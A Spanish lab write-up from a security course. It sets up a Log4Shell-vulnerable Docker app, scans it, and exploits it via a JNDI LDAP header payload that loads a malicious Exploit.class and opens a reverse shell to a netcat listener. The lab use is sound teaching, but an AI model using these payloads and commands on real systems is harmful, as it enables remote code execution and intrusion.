# Aplicación vulnerable

Se va a utilizar la máquina virtual de la práctica 5 para lanzar un servidor web vulnerable a *Log4Shell*

### Configuración de Docker

Para ello, primero se instala Docker en el sistema
```sh
# Actualizar el sistema
apt update
apt upgrade
# Instalar docker
apt install apt-transport-https ca-certificates curl gnupg lsb-release
curl -fsSL https://download.docker.com/linux/debian/gpg | sudo gpg --dearmor -o /usr/share/keyrings/docker-archive-keyring.gpg
echo "deb [arch=$(dpkg --print-architecture) signed-by=/usr/share/keyrings/docker-archive-keyring.gpg] https://download.docker.com/linux/debian $(lsb_release -cs) stable" | sudo tee /etc/apt/sources.list.d/docker.list > /dev/null
apt update
apt install docker-ce docker-ce-cli containerd.io
```

Después, para poder lanzar la aplicación vulnerable haciendo login como *user* mediante SSH, se debe crear el grupo *docker* y añadir al usuario en cuestión a él. Tras un reinicio, éste podrá ejecutar `docker` sin requerir de `sudo`
```sh
# Crear grupo docker y añadir a user en él
groupadd docker
usermod -aG docker user
```

### Aplicación web vulnerable: campo *X-Api-Version* de la petición HTTP

Ésta se obtiene de un [proyecto en GitHub](https://github.com/christophetd/log4shell-vulnerable-app) y se lanza como un contenedor Docker

El lanzamiento del servidor web vulnerable se hace de la forma siguiente
```sh
# Lanzar aplicación web vulnerable en el puerto 8080 
docker run --name vulnerable-app --rm -p 8080:8080 ghcr.io/christophetd/log4shell-vulnerable-app
```

Para comprobar que la aplicación web está lanzada, basta con ejecutar lo siguiente en la máquina real
```sh
IP_VM=192.168.56.200
curl ${IP_VM}:8080
```
Ésto debe producir una nueva entrada en el log de la aplicación web lanzada

Para no tener que copiar y pegar el comando de `docker` cada vez, puede añadirse lo siguiente al fichero *~/.bashrc* del usuario *user*:
```sh
# Run the lo4shell-vulnerable web application
function run-vulnerable-app {
	docker run --name vulnerable-app --rm -p 8080:8080 ghcr.io/christophetd/log4shell-vulnerable-app
}
```
De esta forma, la aplicación web se podrá lanzar mediante la ejecución del "comando" `run-vulnerable-app`

### Aplicación web vulnerable: servlet con formulario

La aplicación web de [este otro proyecto](https://github.com/kozmer/log4j-shell-poc/tree/main/vulnerable-application) ofrece un formulario web de login cuyo campo *User* se registra usando *Log4J*

-----------------------------------------------------------------------------------
# Scanner de la vulnerabilidad

Para detectar si un servidor web presenta la vulnerabilidad se ha utilizado el [proyecto de GitHub](https://github.com/cisagov/log4j-scanner) de la agencia de seguridad de Estados Unidos, desarrollado para detectar *Log4Shell*

La parte de éste que se va a utilizar (directorio *log4j-scanner*), no obstante, se basa en realidad en [este otro proyecto](https://github.com/fullhunt/log4j-scan)

```sh
# Clonar repositorio
git clone https://github.com/cisagov/log4j-scanner.git
# Instalar dependencias de Python
cd log4j-scanner/log4j-scanner/
pip3 install -r requirements.txt
```

El scanning consiste en ejecutar lo siguiente:
```sh
./log4j-scan.py -u http://192.168.56.200:8080
```
El resultado será el que se muestra a continuación:
```text
[•] CVE-2021-44228 - Apache Log4j RCE Scanner
[•] Scanner provided by FullHunt.io - The Next-Gen Attack Surface Management Platform.
[•] Secure your External Attack Surface with FullHunt.io.
[•] Initiating DNS callback server (interact.sh).
[%] Checking for Log4j RCE CVE-2021-44228.
[•] URL: http://192.168.56.200:8080
[•] URL: http://192.168.56.200:8080 | PAYLOAD: ${jndi:ldap://192.168.56.200.r0on2hl2xxg149f49322m3t3484rh671n.interact.sh/2uol4pt}
[•] Payloads sent to all URLs. Waiting for DNS OOB callbacks.
[•] Waiting...
[!!!] Targets Affected
{"timestamp": "2021-12-31T06:24:53.630956969Z", "host": "192.168.56.200.r0on2hl2xxg149f49322m3t3484rh671n.r0on2hl2xxg149f49322m3t3484rh671n.interact.sh", "remote_address": "81.47.231.70"}
{"timestamp": "2021-12-31T06:24:53.731751129Z", "host": "192.168.56.200.r0on2hl2xxg149f49322m3t3484rh671n.r0on2hl2xxg149f49322m3t3484rh671n.interact.sh", "remote_address": "80.58.184.143"}
```
En caso de que el servidor no sea vulnerable (como por ejemplo no lo es el servidor Apache instalado en esa misma máquina virtual), entonces se tendrá lo siguiente:
```text
[•] CVE-2021-44228 - Apache Log4j RCE Scanner
[•] Scanner provided by FullHunt.io - The Next-Gen Attack Surface Management Platform.
[•] Secure your External Attack Surface with FullHunt.io.
[•] Initiating DNS callback server (interact.sh).
[%] Checking for Log4j RCE CVE-2021-44228.
[•] URL: http://192.168.56.200
[•] URL: http://192.168.56.200 | PAYLOAD: ${jndi:ldap://192.168.56.200.c823fr0q26y14og696vl56l5ql70p76ng.interact.sh/6c2xf7b}
[•] Payloads sent to all URLs. Waiting for DNS OOB callbacks.
[•] Waiting...
[•] Targets do not seem to be vulnerable.
```

-----------------------------------------------------------------------------------
# Máquina atacante

Se va a utilizar la máquina virtual de la práctica 3 para lanzar el servidor LDAP con código malicioso y la propia máquina real para efectuar el ataque

## Formas de explotar la vulnerabilidad

### Uso de campos de la cabecera HTTP

La herramienta `curl` permite asignar directamente el valor de los campos de la cabecera HTTP en las peticiones que se realizan, por lo que es perfecto para realizar ataques en los que esa es la forma de acceder a la vulnerabilidad

En particular, permite no solo asignar valores a campos, sino también crearlos (aunque no existan en el standard HTTP). Ésto se consigue con el flag *-H*, al cual se le debe asignar un string con formato *"campo:valor"*, donde *campo* es el nombre del campo (existente o no) y *valor* es el valor que se le desea asignar

#### Campo *User-Agent*

Uno de los campos 

```sh
# Inyección como se hizo en la práctica 4
curl ${IP}:${PORT} -A "field value"
# Inyección de la forma análoga a la que se va a realizar con X-Api-Version
curl ${IP}:${PORT} -H 'User-Agent: field value'
```

#### Campo *X-Api-Version*

```sh
# Inyección de campo custom llamado X-Api-Version
curl ${IP}:${PORT} -H 'X-Api-Version: field value'
```

### Uso de campos de formularios

Un ataque de este tipo es prácticamente igual que los anteriores, pero usando el campo del formulario como se ve en [este vídeo](https://user-images.githubusercontent.com/87979263/146113359-20663eaa-555d-4d60-828d-a7f769ebd266.mp4)

-----------------------------------------------------------------------------------
### Prueba de concepto: ataque de la aplicación vulnerable

Sean:
* *192.16.56.1* la IP del atacante
* *192.16.56.100* la IP del servidor LDAP malicioso puesto por el atacante 
* *192.16.56.200* la IP del servidor web vulnerable

Se tiene que:
- Se ha configurado la máquina *192.168.56.100* como un servidor LDAP malicioso que sirve el fichero *Exploit.class*, el cuál, al ser ejecutado, crea un reverse shell que consiste en una conexión y una redirección de la entrada/salida a través de un socket al servicio *192.168.56.1:12345* (es decir, a un servicio lanzado con `netcat` que corre en la máquina del atacante)
- El ataque *Log4Shell* consiste, por lo tanto, en conseguir que la clase *Exploit* se cargue en el servidor vulnerable

Así, si bien se ha intentado configurar el servidor LDAP desde cero, se ha terminado usando un exploit:
```sh
apt update
# Instalar java y javac
apt install default-jdk python3 python3-pip
# Clonar y copiar ficheros necesarios para lanzar el servidor LDAP malicioso
git clone https://github.com/kozmer/log4j-shell-poc.git
cd log4j-shell-poc/
pip3 install -r requirements.txt
```

Para llevar a cabo el ataque que se explica a continuación se han realizado algunas modificaciones sobre el código original, que pueden verse en [este fork](https://github.com/AdriandMartin/log4j-shell-poc/tree/separate-netcat-and-servers)

#### Clase Java con el reverse shell

Esta clase se ha obtenido de [este proyecto de GitHub](https://github.com/kozmer/log4j-shell-poc/blob/main/poc.py). Básicamente se ha copiado en un script que reemplaza la IP y el puerto en el código Java por los argumentos dados, vuelca la clase en un fichero JAVA y lo compila para obtener un CLASS

Para probar que funciona, se ha programado un fichero *Test.java* que hace uso de la clase generada, y que se usa como se explica a continuación

```sh
# Generar y compilar clase Exploit.java, con un reverse shell a 127.0.0.1:12345
./generateExploit.sh 127.0.0.1 12345
# Compilar la clase principal que cree una instancia de Exploit
javac Test.java
# Ejecutar clase que lanza el exploit
java Test
```
Antes de eso, en otro terminal, debe haberse lanzado lo siguiente:
```sh
ncat -lp 12345
```
Si todo funciona correctamente, se podrán ejecutar los comandos que se deseen en el terminal con el proceso `netcat`

#### Script *poc.py*

El script *poc.py* del proyecto [log4j-shell-poc](git clone https://github.com/kozmer/log4j-shell-poc) genera el payload (el fichero *Exploit.class*) y lanza un servidor LDAP que redirige la petición especificada a ese fichero CLASS, que es servido mediante un servidor HTTP que también lanza

Por una parte, lanza un servidor LDAP que devolverá al ser acedido lo que haya en un servidor web en la URL *http://192.168.56.100:1389#Exploit*
```sh
java -cp log4j-shell-poc/target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://192.168.56.100:1389#Exploit
```

[jre 1.8.0_20](https://download.oracle.com/otn/java/jdk/8u20-b26/jdk-8u20-linux-x64.tar.gz)

```sh
mv jdk-8u20-linux-x64.tar.gz log4j-shell-poc/
cd log4j-shell-poc/
tar -xf jdk-8u20-linux-x64.tar.gz
```

En un terminal *1* ejecutamos lo siguiente:
```sh
ncat -lp 12345
```
En un terminal *2* lo siguiente:
```sh
./poc.py --serversip 192.168.56.100 --webport 8000 --ncip 192.168.56.1 --ncport 12345
```
El ataque como tal, lanzado en un terminal *3*, consiste en lo siguiente:
```sh
curl 192.168.56.200:8080 -H 'X-Api-Version: ${jndi:ldap://192.168.56.100:1389/a}'
```

Como resultado, se tiene que en el terminal:
1. Se pueden ejecutar comandos de manera arbitraria
   > 
2. Ha servido el fichero *Exploit.class*, primero atendiendo la petición LDAP y luego sirviéndolo como tal mediante la petición HTTP redirigida
   ```text
	[!] CVE: CVE-2021-44228
	[!] Github repo: https://github.com/kozmer/log4j-shell-poc

	Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
	[+] Exploit java class created success
	[+] Setting up LDAP server

	[+] Send me: ${jndi:ldap://192.168.56.100:1389/a}

	[+] Starting Webserver on port 8000 http://0.0.0.0:8000
	Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
	Listening on 0.0.0.0:1389
	Send LDAP reference result for a redirecting to http://192.168.56.100:8000/Exploit.class
	192.168.56.200 - - [02/Jan/2022 01:50:41] "GET /Exploit.class HTTP/1.1" 200 -
	```
3. Se ha quedado a la espera de una respuesta del servidor atacado que, como está ejecutando el reverse shell, no llega

-----------------------------------------------------------------------------------
### Contramedidas

Tal y como se vio en [este artículo](https://www.lunasec.io/docs/blog/log4j-zero-day-mitigation-guide/), existen contramedidas, pero además hay un [parche que se puede lanzar como un ataque](https://www.lunasec.io/docs/blog/log4shell-live-patch/), que consiste en usar como carga mediante *JNDI* lo siguiente *${jndi:ldap://patch.log4shell.com:1389/a}*. El "ataque" como tal quedaría de la forma siguiente:
```sh
curl 192.168.56.200:8080 -H 'X-Api-Version: ${jndi:ldap://patch.log4shell.com:1389/a}'
```
